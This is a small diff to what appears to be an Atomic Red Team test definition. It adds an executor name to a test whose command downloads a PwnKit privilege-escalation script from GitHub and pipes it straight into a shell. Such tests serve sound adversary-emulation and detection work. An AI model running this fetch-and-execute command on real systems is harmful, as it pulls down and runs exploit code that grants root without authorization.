@@ -13,5 +13,6 @@ atomic_tests:
       type: url
       default: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
   executor:
+    name: sh
     command: |-
       /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
